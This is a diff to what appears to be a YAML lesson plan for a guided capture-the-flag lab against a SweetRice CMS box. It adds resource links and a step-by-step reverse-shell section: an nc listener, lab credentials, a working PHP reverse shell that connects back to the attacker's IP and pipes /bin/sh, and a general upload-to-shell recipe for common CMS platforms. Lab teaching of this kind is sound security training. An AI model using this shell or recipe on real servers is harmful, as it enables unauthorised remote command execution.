@@ -58,6 +58,10 @@ phases:
           0 hosts up means VPN isn't connected or the target isn't running.
           Check: ip a show tun0 (VPN up?), ping -c 1 {target} (reachable?).
           If filtered, try: nmap -Pn {target} to skip host discovery.
+        resources:
+          - title: "Nmap Basics — Alien37 Guide"
+            url: "https://alien37.com/docs/nmap-basics"
+            description: "Nmap flags, scan types, and how to read output"
         conversation: "What do you notice about those two services? Anything jump out?"
 
   - id: web-enum
@@ -171,6 +175,10 @@ phases:
         key_takeaway: |
           Database backups in web-accessible directories are a critical
           misconfiguration. In real pentests, this is how you get credentials fast.
+        resources:
+          - title: "Web Enumeration — Alien37 Guide"
+            url: "https://alien37.com/docs/web-enumeration"
+            description: "Finding hidden files, directories, and misconfigurations"
         conversation: "Database backups in a public directory — that's a serious finding. Why is this so dangerous?"
 
       - id: grab-creds
@@ -195,18 +203,69 @@ phases:
           We have admin access to SweetRice. CMS admin panels almost always
           let you upload files or edit code. We're going to get a reverse shell.
 
-          Steps:
-          1. Set up a listener: nc -lvnp 4444
-          2. Log into SweetRice at /content/as/ with the creds we found
-          3. Go to the Ads section — it lets you add code
-          4. Paste a PHP reverse shell (edit IP to your VPN IP, port 4444)
-          5. Visit http://{target}/content/inc/ads/your_ad.php to trigger it
+          What's a reverse shell? Normally YOU connect to a server. A reverse
+          shell flips that — the TARGET connects back to YOU. Why? Because
+          firewalls usually block incoming connections but allow outgoing ones.
+          The server "calls you back" and gives you a command line.
+
+          Here's the plan:
+
+          STEP 1 — Start a listener on YOUR machine (new terminal):
+            nc -lvnp 4444
+            (-l listen, -v verbose, -n no DNS, -p port)
+            This sits and waits for the target to connect back.
+
+          STEP 2 — Log into SweetRice at http://{target}/content/as/
+            Use the creds we found: manager / Password123
+
+          STEP 3 — Go to the Ads section and add a new ad.
+            The ad editor lets you insert raw PHP code — that's our way in.
+
+          STEP 4 — Paste this PHP reverse shell as the ad code:
+
+            <?php
+            set_time_limit(0);
+            $ip = 'YOUR_VPN_IP';   // <-- change this to your tun0 IP
+            $port = 4444;          // <-- must match your nc listener
+            $sock = fsockopen($ip, $port);
+            $proc = proc_open('/bin/sh', array(
+                0 => $sock,   // stdin  — reads from your listener
+                1 => $sock,   // stdout — sends output to you
+                2 => $sock    // stderr — sends errors to you too
+            ), $pipes);
+            ?>
+
+            How this works line by line:
+            - set_time_limit(0) prevents PHP from killing the script
+            - fsockopen() makes a TCP connection FROM the server TO you
+            - proc_open() spawns /bin/sh and wires its input/output
+              through that socket — so you type commands, the server runs
+              them, and you see the output
+            - The three array entries (0,1,2) are stdin, stdout, stderr —
+              all pointed at the socket so everything flows through
+
+            Find your VPN IP with: ip a show tun0
+
+          STEP 5 — Save the ad, then visit the URL to trigger it:
+            http://{target}/content/inc/ads/your_ad.php
+            Check your nc listener — you should have a shell as www-data.
         command: null
         explanation: |
-          A reverse shell connects BACK to your machine — the target calls you.
-          nc -lvnp 4444 listens on port 4444 for incoming connections.
-          The PHP reverse shell (pentestmonkey) executes on the web server
-          and connects back to your listener. Upload + trigger = shell.
+          Why this works: SweetRice's ad editor saves your input as a .php
+          file in /content/inc/ads/. The web server executes any .php file
+          when you visit it. So we write PHP code that connects back to us,
+          visit the file, Apache runs it, and our listener catches the shell.
+
+          The shell above is a minimal reverse shell. The full pentestmonkey
+          version (see Resources) is more robust — it handles edge cases,
+          upgrades the shell, and works on more systems. But the concept is
+          identical: socket + shell process = remote command execution.
+
+          You'll use this exact pattern over and over:
+          1. Find somewhere you can upload/inject code
+          2. Write code that connects back to your listener
+          3. Trigger execution
+          4. Catch the shell
         look_for:
           - "Connection received on nc listener"
           - "Shell as www-data (the web server user)"
@@ -214,6 +273,20 @@ phases:
           CMS admin panel → file upload or code injection → reverse shell.
           This pattern works on WordPress, Joomla, Drupal, and obscure
           CMS platforms. If you can upload and execute, you've got a shell.
+
+          The core concept: any time you can make a server execute your code,
+          you can get a shell. The code just needs to open a connection back
+          to you and pipe a shell process through it.
+        resources:
+          - title: "Reverse Shells Deep Dive — Alien37"
+            url: "https://alien37.com/docs/reverse-shells"
+            description: "Different shell types, upgrading shells, and when to use each"
+          - title: "pentestmonkey PHP reverse shell"
+            url: "https://github.com/pentestmonkey/php-reverse-shell"
+            description: "The full-featured PHP reverse shell with TTY handling and cleanup"
+          - title: "RevShells Generator"
+            url: "https://www.revshells.com"
+            description: "Generate reverse shell one-liners for any language — just enter your IP and port"
         conversation: "This upload-to-shell pattern is one of the most common initial access methods. Where else might you find file upload functionality?"
 
   - id: privesc
@@ -236,7 +309,14 @@ phases:
         key_takeaway: |
           sudo -l is THE first command after getting a shell. If you can
           run an interpreter (perl, python, ruby, vim) as root, game over.
-        conversation: "Check gtfobins.github.io — it lists how to exploit almost any binary with elevated privileges."
+        resources:
+          - title: "GTFOBins"
+            url: "https://gtfobins.github.io"
+            description: "Curated list of Unix binaries that can be exploited for privilege escalation"
+          - title: "Linux Privilege Escalation — Alien37 Guide"
+            url: "https://alien37.com/docs/linux-privesc"
+            description: "sudo, SUID, cron, and other Linux privesc techniques"
+        conversation: "Check GTFOBins for perl — it lists exactly how to exploit it. What other binaries on that list have you seen before?"
 
       - id: get-root
         narration: |
